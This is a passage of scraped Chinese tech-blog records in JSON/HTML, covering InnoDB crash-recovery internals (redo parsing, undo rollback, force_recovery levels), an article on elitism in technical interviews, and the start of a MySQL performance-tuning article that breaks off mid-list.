rbtree。<code>recv_sys</code>结构主要在崩溃恢复前滚阶段使用。hash_table就是之前说的用来存不同数据页日志的哈希表，哈希表的大小被初始化为buffer_size_in_bytes/512, 这个是哈希表最大的长度，超过就存不下了，幸运的是，需要恢复的数据页的个数不会超过这个值，因为buffer poll最多(数据库崩溃之前脏页的上线)只能存放buffer_size_in_bytes/16KB个数据页，即使考虑压缩页，最多也只有buffer_size_in_bytes/1KB个，此外关于这个哈希表内存分配的大小，可以参考bug#53122。flush list rbtree这个主要是为了加入插入脏页列表，InnoDB的flush list必须按照数据页的最老修改lsn(oldest_modifcation)从小到大排序，在数据库正常运行时，可以通过log_sys-&gt;mutex和log_sys-&gt;log_flush_order_mutex保证顺序，在崩溃恢复则没有这种保证，应用数据的时候，是从第一个元素开始遍历哈希表，不能保证数据页按照最老修改lsn(oldest_modifcation)从小到大排序，这样就需要线性遍历flush_list来寻找插入位置，效率太低，因此引入红黑树，加快查找插入的位置。<br>\n接着，从ib_logfile0的头中读取checkpoint信息，主要包括checkpoint_lsn和checkpoint_no。由于InnoDB日志是循环使用的，且最少要有2个，所以ib_logfile0一定存在，把checkpoint信息存在里面很安全，不用担心被删除。checkpoint信息其实会写在文件头的两个地方，两个checkpoint域轮流写。为什么要两个地方轮流写呢？假设只有一个checkpoint域，一直更新这个域，而checkpoint域有512字节(<code>OS_FILE_LOG_BLOCK_SIZE</code>)，如果刚好在写这个512字节的时候，数据库挂了，服务器也挂了(先不考虑硬件的原子写特性，早期的硬件没有这个特性)，这个512字节可能只写了一半，导致整个checkpoint域不可用。这样数据库将无法做崩溃恢复，从而无法启动。如果有两个checkpoint域，那么即使一个写坏了，还可以用另外一个尝试恢复，虽然有可能这个时候日志已经被覆盖，但是至少提高了恢复成功的概率。两个checkpoint域轮流写，也能减少磁盘扇区故障带来的影响。checkpoint_lsn之前的数据页都已经落盘，不需要前滚，之后的数据页可能还没落盘，需要重新恢复出来，即使已经落盘也没关系，因为redo日志时幂等的，应用一次和应用两次都一样(底层实现: 如果数据页上的lsn大于等于当前redo日志的lsn，就不应用，否则应用。checkpoint_no可以理解为checkpoint域写盘的次数，每次刷盘递增1，同时这个值取模2可以用来实现checkpoint_no域的轮流写。正常逻辑下，选取checkpoint_no值大的作为最终的checkpoint信息，用来做后续崩溃恢复扫描的起始点。<br>\n接着，使用checkpoint域的信息初始化recv_sys结构体的一些信息后，就进入日志解析的核心函数<code>recv_group_scan_log_recs</code>，这个函数后续我们再分析，主要作用就是解析redo日志，如果内存不够了，就直接调用应用(<code>recv_apply_hashed_log_recs</code>)日志，然后再接着解析。如果需要应用的日志很少，就仅仅解析分发日志，到<code>recv_recovery_from_checkpoint_finish</code>函数中在应用日志。<br>\n接着，依据当前刷盘的数据页状态做一次checkpoint，因为在<code>recv_group_scan_log_recs</code>里可能已经应用部分日志了。至此<code>recv_recovery_from_checkpoint_start_func</code>函数结束。<br>\n在<code>recv_recovery_from_checkpoint_finish</code>函数中，如果srv_force_recovery设置正确，就开始调用函数<code>recv_apply_hashed_log_recs</code>应用日志，然后等待刷脏的线程退出(线程是崩溃恢复时临时启动的)，最后释放recv_sys的相关资源以及hash_table占用的内存。<br>\n至此，数据库前滚结束。接下来，我们详细分析一下redo日志解析函数以及redo日志应用函数的实现细节。</p>\n<h2 id=\"redo日志解析函数\">redo日志解析函数</h2>\n<p>解析函数的最上层是<code>recv_group_scan_log_recs</code>，这个函数调用底层函数(<code>log_group_read_log_seg</code>)，按照RECV_SCAN_SIZE(64KB)大小分批读取。读取出来后，首先通过block_no和lsn之间的关系以及日志checksum判断是否读到了日志最后(所以可以看出，并没一个标记在日志头标记日志的有效位置，完全是按照上述两个条件判断是否到达了日志尾部)，如果读到最后则返回(之前说了，即使数据库是正常关闭的，也要走崩溃恢复逻辑，那么在这里就返回了，因为正常关闭的checkpoint值一定是指向日志最后)，否则则把日志去头掐尾放到一个recv_sys-&gt;buf中，日志头里面存了一些控制信息和checksum值，只是用来校验和定位，在真正的应用中没有用。在放到recv_sys-&gt;buf之前，需要检验一下recv_sys-&gt;buf有没有满(<code>RECV_PARSING_BUF_SIZE</code>，2M)，满了就报错(如果上一批解析有不完整的日志，日志解析函数不会分发，而是把这些不完整的日志留在recv_sys-&gt;buf中，直到解析到完整的日志)。接下的事情就是从recv_sys-&gt;buf中解析日志(<code>recv_parse_log_recs</code>)。日志分两种：single_rec和multi_rec，前者表示只对一个数据页进行一种操作，后者表示对一个或者多个数据页进行多种操作。日志中还包括对应数据页的space_id，page_no，操作的type以及操作的内容(<code>recv_parse_log_rec</code>)。解析出相应的日志后，按照space_id和page_no进行哈希(如果对应的表空间在内存中不存在，则表示表已经被删除了)，放到hash_table里面(日志真正存放的位置依然在buffer pool)即可，等待后续应用。这里有几个点值得注意：</p>\n<ul>\n<li>如果是multi_rec类型，则只有遇到MLOG_MULTI_REC_END这个标记，日志才算完整，才会被分发到hash_table中。查看代码，我们可以发现multi_rec类型的日志被解析了两次，一次用来校验完整性(寻找MLOG_MULTI_REC_END)，第二次才用来分发日志，感觉这是一个可以优化的点。</li>\n<li>目前日志的操作type有50多种，每种操作后面的内容都不一样，所以长度也不一样，目前日志的解析逻辑，需要依次解析出所有的内容，然后确定长度，从而定位下一条日志的开始位置。这种方法效率略低，其实可以在每种操作的头上加上一个字段，存储后面内容的长度，这样就不需要解析太多的内容，从而提高解析速度，进一步提高崩溃恢复速度，从结果看，可以提高一倍的速度(从38秒到14秒，详情可以参见bug#82937)。</li>\n<li>如果发现checkpoint之后还有日志，说明数据库之前没有正常关闭，需要做崩溃恢复，因此需要做一些额外的操作(<code>recv_init_crash_recovery</code>)，比如在错误日志中打印我们常见的“Database was not shutdown normally!”和“Starting crash recovery.”，还要从double write buffer中检查是否发生了数据页半写，如果有需要恢复(<code>buf_dblwr_process</code>)，还需要启动一个线程用来刷新应用日志产生的脏页(因为这个时候buf_flush_page_cleaner_thread还没有启动)。最后还需要打开所有的表空间。。注意是所有的表。。。我们在阿里云RDS MySQL的运维中，常常发现数据库hang在了崩溃恢复阶段，在错误日志中有类似“Reading tablespace information from the .ibd files…”字样，这就表示数据库正在打开所有的表，然后一看表的数量，发现有几十甚至上百万张表。。。数据库之所以要打开所有的表，是因为在分发日志的时候，需要确定space_id对应哪个ibd文件，通过打开所有的表，读取space_id信息来确定，另外一个原因是方便double write buffer检查半写数据页。针对这个表数量过多导致恢复过慢的问题，MySQL 5.7做了优化，WL#7142， 主要思想就是在每次checkpoint后，在第一次修改某个表时，先写一个新日志mlog_file_name(包括space_id和filename的映射)，来表示对这个表进行了操作，后续对这个表的操作就不用写这个新日志了，当需要崩溃恢复时候，多一次扫描，通过搜集mlog_file_name来确定哪些表被修改过，这样就不需要打开所有的表来确定space_id了。</li>\n<li>最后一个值得注意的地方是内存。之前说过，如果有太多的日志已经被分发，占用了太多的内存，日志解析函数会在适当的时候应用日志，而不是等到最后才一起应用。那么问题来了，使用了多大的内存就会出发应用日志逻辑。答案是：buffer_pool_size_in_bytes – 512 * buffer_pool_instance_num * 16KB。由于buffer_pool_instance_num一般不会太大，所以可以任务，buffer pool的大部分内存都被用来存放日志。剩下的那些主要留给应用日志时读取的数据页，因为目前来说日志应用是单线程的，读取一个日志，把所有日志应用完，然后就可以刷回磁盘了，不需要太多的内存。</li>\n</ul>\n<h2 id=\"redo日志应用函数\">redo日志应用函数</h2>\n<p>应用日志的上层函数为<code>recv_apply_hashed_log_recs</code>(应用日志也可能在io_helper函数中进行)，主要作用就是遍历hash_table，从磁盘读取对每个数据页，依次应用哈希桶中的日志。应用完所有的日志后，如果需要则把buffer_pool的页面都刷盘，毕竟空间有限。有以下几点值得注意：</p>\n<ul>\n<li>同一个数据页的日志必须按照lsn从小到大应用，否则数据会被覆盖。只应用redo日志lsn大于page_lsn的日志，只有这些日志需要重做，其余的忽略。应用完日志后，把脏页加入脏页列表，由于脏页列表是按照最老修改lsn(oldest_modification)来排序的，这里通过引入一颗红黑树来加速查找插入的位置，时间复杂度从之前的线性查找降为对数级别。</li>\n<li>当需要某个数据页的时候，如果发现其没有在Buffer Pool中，则会查看这个数据页周围32个数据页，是否也需要做恢复，如果需要则可以一起读取出来，相当于做了一次io合并，减少io操作(<code>recv_read_in_area</code>)。由于这个是异步读取，所以最终应用日志的活儿是由io_helper线程来做的(<code>buf_page_io_complete</code>)，此外，为了防止短时间发起太多的io，在代码中加了流量控制的逻辑(<code>buf_read_recv_pages</code>)。如果发现某个数据页在内存中，则直接调用<code>recv_recover_page</code>应用日志。由此我们可以看出，InnoDB应用日志其实并不是单线程的来应用日志的，除了崩溃恢复的主线程外，io_helper线程也会参与恢复。并发线程数取决于io_helper中读取线程的个数。</li>\n</ul>\n<p>执行完了redo前滚数据库，数据库的所有数据页已经处于一致的状态，undo回滚数据库就可以安全的执行了。数据库崩溃的时候可能有一些没有提交的事务或者已经提交的事务，这个时候就需要决定是否提交。主要分为三步，首先是扫描undo日志，重新建立起undo日志链表，接着是，依据上一步建立起的链表，重建崩溃前的事务，即恢复当时事务的状态。最后，就是依据事务的不同状态，进行回滚或者提交。</p>\n<h2 id=\"undo日志回滚数据库\">undo日志回滚数据库</h2>\n<p>在<code>recv_recovery_from_checkpoint_start_func</code>之后，<code>recv_recovery_from_checkpoint_finish</code>之前，调用了<code>trx_sys_init_at_db_start</code>，这个函数做了上述三步中的前两步。<br>\n第一步在函数<code>trx_rseg_array_init</code>中处理，遍历整个undo日志空间(最多TRX_SYS_N_RSEGS(128)个segment)，如果发现某个undo segment非空，就进行初始化(<code>trx_rseg_create_instance</code>)。整个每个undo segment，如果发现undo slot非空(最多TRX_RSEG_N_SLOTS(1024)个slot)，也就行初始化(<code>trx_undo_lists_init</code>)。在初始化undo slot后，就把不同类型的undo日志放到不同链表中(<code>trx_undo_mem_create_at_db_start</code>)。undo日志主要分为两种：TRX_UNDO_INSERT和TRX_UNDO_UPDATE。前者主要是提供给insert操作用的，后者是给update和delete操作使用。之前说过，undo日志有两种作用，事务回滚时候用和MVCC快照读取时候用。由于insert的数据不需要提供给其他线程用，所以只要事务提交，就可以删除TRX_UNDO_INSERT类型的undo日志。TRX_UNDO_UPDATE在事务提交后还不能删除，需要保证没有快照使用它的时候，才能通过后台的purge线程清理。<br>\n第二步在函数<code>trx_lists_init_at_db_start</code>中进行，由于第一步中，已经在内存中建立起了undo_insert_list和undo_update_list(链表每个undo segment独立)，所以这一步只需要遍历所有链表，重建起事务的状态(<code>trx_resurrect_insert</code>和<code>trx_resurrect_update</code>)。简单的说，如果undo日志的状态是TRX_UNDO_ACTIVE，则事务的状态为TRX_ACTIVE，如果undo日志的状态是TRX_UNDO_PREPARED，则事务的状态为TRX_PREPARED。这里还要考虑变量srv_force_recovery的设置，如果这个变量值为非0，所有的事务都会回滚(即事务被设置为TRX_ACTIVE)，即使事务的状态应该为TRX_STATE_PREPARED。重建起事务后，按照事务id加入到trx_sys-&gt;trx_list链表中。最后，在函数<code>trx_sys_init_at_db_start</code>中，会统计所有需要回滚的事务(事务状态为TRX_ACTIVE)一共需要回滚多少行数据，输出到错误日志中，类似：5 transaction(s) which must be rolled back or cleaned up。InnoDB: in total 342232 row operations to undo的字样。<br>\n第三步的操作在两个地方被调用。一个是在<code>recv_recovery_from_checkpoint_finish</code>的最后，另外一个是在<code>recv_recovery_rollback_active</code>中。前者主要是回滚对数据字典的操作，也就是回滚DDL语句的操作，后者是回滚DML语句。前者是在数据库可提供服务之前必须完成，后者则可以在数据库提供服务(也即是崩溃恢复结束)之后继续进行(通过新开一个后台线程<code>trx_rollback_or_clean_all_recovered</code>来处理)。因为InnoDB认为数据字典是最重要的，必须要回滚到一致的状态才行，而用户表的数据可以稍微慢一点，对外提供服务后，慢慢恢复即可。因此我们常常在会发现数据库已经启动起来了，然后错误日志中还在不断的打印回滚事务的信息。事务回滚的核心函数是<code>trx_rollback_or_clean_recovered</code>，逻辑很简单，只需要遍历trx_sys-&gt;trx_list，按照事务不同的状态回滚或者提交即可(<code>trx_rollback_resurrected</code>)。这里要注意的是，如果事务是TRX_STATE_PREPARED状态，那么在InnoDB层，不做处理，需要在Server层依据binlog的情况来决定是否回滚事务，如果binlog已经写了，事务就提交，因为binlog写了就可能被传到备库，如果主库回滚会导致主备数据不一致，如果binlog没有写，就回滚事务。</p>\n<h2 id=\"崩溃恢复相关参数解析\">崩溃恢复相关参数解析</h2>\n<p><strong><em>innodb_fast_shutdown: </em></strong><br>\ninnodb_fast_shutdown = 0。这个表示在MySQL关闭的时候，执行slow shutdown，不但包括日志的刷盘，数据页的刷盘，还包括数据的清理(purge)，ibuf的合并，buffer pool dump以及lazy table drop操作(如果表上有未完成的操作，即使执行了drop table且返回成功了，表也不一定立刻被删除)。<br>\ninnodb_fast_shutdown = 1。这个是默认值，表示在MySQL关闭的时候，仅仅把日志和数据刷盘。<br>\ninnodb_fast_shutdown = 2。这个表示关闭的时候，仅仅日志刷盘，其他什么都不做，就好像MySQL crash了一样。<br>\n这个参数值越大，MySQL关闭的速度越快，但是启动速度越慢，相当于把关闭时候需要做的工作挪到了崩溃恢复上。另外，如果MySQL要升级，建议使用第一种方式进行一次干净的shutdown。</p>\n<p><strong><em>innodb_force_recovery: </em></strong><br>\n这个参数主要用来控制InnoDB启动时候做哪些工作，数值越大，做的工作越少，启动也更加容易，但是数据不一致的风险也越大。当MySQL因为某些不可控的原因不能启动时，可以设置这个参数，从1开始逐步递增，知道MySQL启动，然后使用SELECT INTO OUTFILE把数据导出，尽最大的努力减少数据丢失。<br>\ninnodb_force_recovery = 0。这个是默认的参数，启动的时候会做所有的事情，包括redo日志应用，undo日志回滚，启动后台master和purge线程，ibuf合并。检测到了数据页损坏了，如果是系统表空间的，则会crash，用户表空间的，则打错误日志。<br>\ninnodb_force_recovery = 1。如果检测到数据页损坏了，不会crash也不会报错(<code>buf_page_io_complete</code>)，启动的时候也不会校验表空间第一个数据页的正确性(<code>fil_check_first_page</code>)，表空间无法访问也继续做崩溃恢复(<code>fil_open_single_table_tablespace</code>、<code>fil_load_single_table_tablespace</code>)，ddl操作不能进行(<code>check_if_supported_inplace_alter</code>)，同时数据库也被不能进行写入操作(<code>row_insert_for_mysql</code>、<code>row_update_for_mysql</code>等)，所有的prepare事务也会被回滚(<code>trx_resurrect_insert</code>、<code>trx_resurrect_update_in_prepared_state</code>)。这个选项还是很常用的，数据页可能是因为磁盘坏了而损坏了，设置为1，能保证数据库正常启动。<br>\ninnodb_force_recovery = 2。除了设置1之后的操作不会运行，后台的master和purge线程就不会启动了(<code>srv_master_thread</code>、<code>srv_purge_coordinator_thread</code>等)，当你发现数据库因为这两个线程的原因而无法启动时，可以设置。<br>\ninnodb_force_recovery = 3。除了设置2之后的操作不会运行，undo回滚数据库也不会进行，但是回滚段依然会被扫描，undo链表也依然会被创建(<code>trx_sys_init_at_db_start</code>)。srv_read_only_mode会被打开。<br>\ninnodb_force_recovery = 4。除了设置3之后的操作不会运行，ibuf的操作也不会运行(<code>ibuf_merge_or_delete_for_page</code>)，表信息统计的线程也不会运行(因为一个坏的索引页会导致数据库崩溃)(<code>info_low</code>、<code>dict_stats_update</code>等)。从这个选项开始，之后的所有选项，都会损坏数据，慎重使用。<br>\ninnodb_force_recovery = 5。除了设置4之后的操作不会运行，回滚段也不会被扫描(<code>recv_recovery_rollback_active</code>)，undo链表也不会被创建，这个主要用在undo日志被写坏的情况下。<br>\ninnodb_force_recovery = 6。除了设置5之后的操作不会运行，数据库前滚操作也不会进行，包括解析和应用(<code>recv_recovery_from_checkpoint_start_func</code>)。</p>\n<h2 id=\"总结\">总结</h2>\n<p>InnoDB实现了一套完善的崩溃恢复机制，保证在任何状态下(包括在崩溃恢复状态下)数据库挂了，都能正常恢复，这个是与文件系统最大的差别。此外，崩溃恢复通过redo日志这种物理日志来应用数据页的方法，给MySQL Replication带来了新的思路，备库是否可以通过类似应用redo日志的方式来同步数据呢？阿里云RDS MySQL团队在后续的产品中，给大家带来了类似的特性，敬请期待。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113312\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113312votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113312\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"}
{"url_object_id": "37c15e1679dcae4dfdeabd16f1e6f975", "title": "技术面试中的精英主义", "url": "http://blog.jobbole.com/113217/", "create_date": "2017/12/11", "front_img_url": ["http://ww1.sinaimg.cn/mw690/7cc829d3gw1esx16njnxrj21hc140gw4.jpg"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 0, "tags": "职场,技术面试,面试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/duydls\">duydls</a> 翻译，<a href=\"http://www.jobbole.com/members/buntamarui\">小米云豆粥</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.designlimbo.com/elitism-in-technology-interviews/\">Shawn Jackson</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p class=\"p1\" data-incom=\"P3\">【导读】：技术面试有很多比较深入的 CS 问题，对每个面试官来说，他们也都有自己最喜欢提的问题。但是对于招聘及面试，相比于以上那些问题，更重要的是要针对这个岗位需要什么样的人，而不是一味为难求职者，就算想问一些比较难的 CS 问题，也要有提出的理由。</p>\n<p class=\"p1\" data-incom=\"P3\"><img class=\"alignnone\" src=\"http://ww1.sinaimg.cn/mw690/7cc829d3gw1esx16njnxrj21hc140gw4.jpg\" width=\"563\" height=\"423\"></p>\n<p class=\"p1\" data-incom=\"P3\">我已经在 IT 领域工作了相当长时间，有 12 年了。作为一个曾经的求职者和面试官，我对面试有一个客观公平的看法。这种看法来自于个人面试经验，在这些面试中，面试官都高高在上，而且他们都有自己喜欢问的问题。其中我最喜欢的面试题包括：①二叉树排序算法，②编写代码求解一个多项式方程 ③以及编写一个编译器。到目前为止，我所经历的最糟糕的面试来自亚马逊和 Intuit，他们分别问到了二叉树和多项式。</p>\n<p class=\"p2\" data-incom=\"P6\">除此以外，我还喜欢问求职者，你们每天花多长时间在那些事情？90% 的回答都会是‘从不’，或者绝大多数时间。尽管绝大多数公司都不愿意承认，计算机水平面试题是有年龄歧视的。当你离开 CS 项目一段时间却又没有每天温习（就像绝大多数高级业务程序员），你就和这些知识生疏了。计算机面试题可以帮助你找到这样的人：a）在面试前学习过一本算法书 b）刚从大学毕业。也有些人在经历过多年的职业生涯以后还可以完美回答这些问题，但是就我的经验而言，这些人多半是业务一线的开发者。</p>\n<p class=\"p1\" data-incom=\"P8\">这也是我为现在公司的面试流程感到骄傲的原因。我们会给你一个能反映出公司日常工作内容的编程问题”。你可以向我们展示你的能力。然后我们会花大概 45 分钟的时间和你一起预演一遍项目并且提问，这样有助于我们了解你的想法和展示你的思路。</p>\n<p class=\"p1\" data-incom=\"P8\"><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmcx90uqskj20gr0d475b.jpg\" width=\"551\" height=\"431\"></p>\n<p class=\"p1\" data-incom=\"P10\">如果你恰好没有向我们展示你在编程项目上的技巧，我们会问一些其它正常的技术问题。我们试图保持一个轻松的氛围，我们会问你在某个问题上的技术水平（1 代表新手，10 代表专家），这样一来你就不会被某些你可能不知道答案的问题所打击到。我们的面试流程是完美的么？绝不，我们每周都在试图改善和提高这个流程。</p>\n<p class=\"p1\" data-incom=\"P12\">这就是为什么当我看到这个 <a href=\"https://www.glassdoor.com/Interview/Paylocity-Interview-Questions-E29987.htm?filter.jobTitleExact=Software+Engineer+.NET#InterviewReview_929569\">Glassdoor 上的评论</a>后彻底震惊了。这里面有些抱怨是有效的，比如面试官没有及时告诉应聘者结果和不理睬应聘者是不可以被接受的。我从来没有在任何技术面试后立刻收到面试结果，往往都会有一些延迟，但没有任何人联系求职者并给出反馈意见，这样就不好了。（伯乐在线注：Glassdoor 是国外一家点评雇主的网站）</p>\n<p class=\"p1\" data-incom=\"P14\">但是这个评论启发我意识到精英观念是相对的。作为那个求职者，要回答 JavaScript 的问题看上去有点不合理，他或许是一个后端开发者。作为新一代的只使用 ORM’ 的开发者，他们或许没有任何 SQL 的经验。某些对我们而言简单和无害的问题，对其它人而言也许会很古怪。</p>\n<p class=\"p1\" data-incom=\"P16\">面试题应该是经过仔细思考、有意义并且能体现求职者所申请工作岗位的职能。你不一定非得通过一个很难的计算机问题来考察求职者是如何解决问题的。如果你觉得陷应试者于窘境是一种享受，那你应该把自己从面试工作中解放出来。这并不是说我们不能问我们最喜欢的问题，但是我们要有一个合理的理由问，而不是在求职者离开以后贬损他。</p>\n<p class=\"p1\" data-incom=\"P18\">在你的机构/公司里，每一个部分都需要技术天才么？如果你的答案是 Yes，那你就是在寻找独角兽，也许你应该重新审查你的需求。在我的职业生涯中，曾经与我共事并且真正令我惊喜的开发者们寥寥可数。但他们也不是对公司里所用到的所有技术/系统/语言都超级擅长。因为这个，我喜欢准备不同水平的面试问题，并且我感觉这样做很有效。如果你告诉我你在某一个方面是专家，你最好可以证明这一点。</p>\n<p class=\"p1\" data-incom=\"P20\">个人来讲，我把求职者与公司文化的匹配度和求职者的个性放在首要位置。在那之后是他们学习和适应新事物的能力，再之后是对待工作的激情。面试是一个困难和非完美的过程，没有人会有一个 100% 无懈可击的面试，当我们尝试帮助他们提高的时候，要试着去除精英主义。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113217\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113217votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113217\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/duydls\">duydls</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/duydls\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/duydls\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/duydls/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/duydls/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/536b64ffdc363d8fbb2e76690b23066591ee2e91.jpg"}
{"url_object_id": "9d1a4f483de8dad0a4da4300eacbcc09", "title": "MySQL 性能调优技巧", "url": "http://blog.jobbole.com/113197/", "create_date": "2017/12/06", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": 1, "comment_nums": 2, "favor_nums": 1, "tags": "IT技术,MySQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://dzone.com/articles/mysql-performance-tuning-tips-for-the-shopping-sea\">Shree Nair</a>   译文出处：<a target=\"_blank\" href=\"http://www.iteye.com/news/32796\">ITeye/无阻我飞扬</a>   </div><blockquote><p><em>摘要：针对购物旺季网站流量会对数据库造成的压力，作者给出了MySQL性能调优的一些技巧，这些技巧极具参考价值，通过这些调优，可以有效避免因为流量过大造成服务器宕机，从而给企业造成经济损失。以下是译文</em></p></blockquote>\n<p>万圣节已经过去很久了，该是把注意力集中在即将到来的假日季节的时候了。首先是感恩节，接着就是黑色星期五和网络星期一，最终在圣诞节/节礼周（从12月26日的节礼日开始，到12月31日的除夕结束为期六天或更长时间。这个词是由零售业在2000年代中期左右发明的，试图延长他们的节礼日销售）达到购物高潮。对于企业主来说，一年的这个时候标志着人们期待已久的年底获利了结。对于一些DBA来说，它会带来恐惧，不安，甚至是不眠之夜，他们要努力使系统重新上线。</p>\n<p>值得庆幸是，情况并非如此。通过对MySQL性能变量做一些主动调整，可以使数据库服务器免受购物旺季带来的需求增加的冲击。</p>\n<h3>技巧#1：确定MySQL的最大连接数</h3>\n<p>对于MySQL的最大连接数，一次最好是发送5个请求到Web服务器。对Web服务器的5个请求中的一部分将用于CSS样式表，图像和脚本等资源。由于诸如浏览器缓存等原因，要获得准确的MySQL到Web服务器的请求比率可能很困难; 要想得到一个确切的数字，就需要分析Web服务器的日志文件。例如，可以手动访问Apache的“access_log”日志文件，也可以通过<a href=\"http://www.debianhelp.co.uk/analog.htm\" target=\"_blank\">Analog</a>或<a href=\"http://www.webalizer.org/\" target=\"_blank\">Webalizer</a>等实用程序访问日志文件。</p>\n<p>一旦有了对特定使用情况的准确估计，请将该比率乘以Web服务器的最大连接数。例如，如果Web服务器配置为最多为256个客户端提供服务，MySQL请求与Web请求的比率为1/8，则最好将最大数据库连接数设置为32。还要考虑留有安全余量，把这个数乘以2，得到最终的数量。只有在基础设施支持的情况下，才能尝试将数据库连接数的最大数量与Web服务器的客户端限制相匹配。在大多数情况下，最好保持接近32。</p>\n<p><strong>在Monyog中查看MySQL连接</strong></p>\n<p>在MySQL数据库中，MySQL的最大并发连接数是存储在全局变量max_connections中的。Monyog报告变量“max_connections”作为当前连接监控组中的“最大允许”指标。它还将该数字除以打开的连接数，以生成连接使用百分比：</p>\n<p>还有一个连接历史记录监控，可以帮助计算最佳的最大并发连接数。它包括尝试，拒绝和成功连接的数量。此外，允许达到的最大指标的百分比显示为一个进度条，可以让你快速评估服务器在过去达到的最大并发连接数：</p>\n<h3>技巧#2：为临时表分配足够的内存</h3>\n<p>在某些情况下，服务器在处理语句时会创建内部临时表。临时表用于内部操作如GROUP BY和distinct，还有一些ORDER BY查询以及UNION和FROM子句（派生表）中的子查询。这些都是在内存中创建的内存表。内存中临时表的最大大小由tmp_table_size和max_heap_table_size中较小的值确定。如果临时表的大小超过这个阈值，则将其转换为磁盘上的InnoDB或MyISAM表。此外，如果查询涉及BLOB或TEXT列，而这些列不能存储在内存表中，临时表总是直接指向磁盘。</p>\n<p>这种转换的代价很大，所以考虑增加max_heap_table_size和tmp_table_size变量的大小来帮助减少在磁盘上创建临时表的数量。请记住，这将需要大量内存，因为内存中临时表的大小是基于“最坏情况”的。例如，内存表总是使用固定长度的列，所以字符列使用VARCHAR（255）。这可以使内存中的临时表比想象的要大得多—事实上，这比查询表的总大小要大很多倍！当增加max_heap_table_size和tmp_table_sizevariables的大小时，一定要监视服务器的内存使用情况，因为内存中的临时表可能会增加达到服务器内存容量的风险。</p>\n<p>一般来说，32M到64M是建议值，从这两个变量开始并根据需要进行调优。</p>\n<p><strong>在Monyog中的临时表监测</strong></p>\n<p>临时表的监测是许多预定义的Monyog监测之一。它提供了一些临时表使用的指标，包括：</p>\n<ul>\n<li><strong>允许的最大值</strong>：显示tmp_table_size服务器变量的值，它定义了在内存中创建的临时表的最大大小。与max_heap_table_size一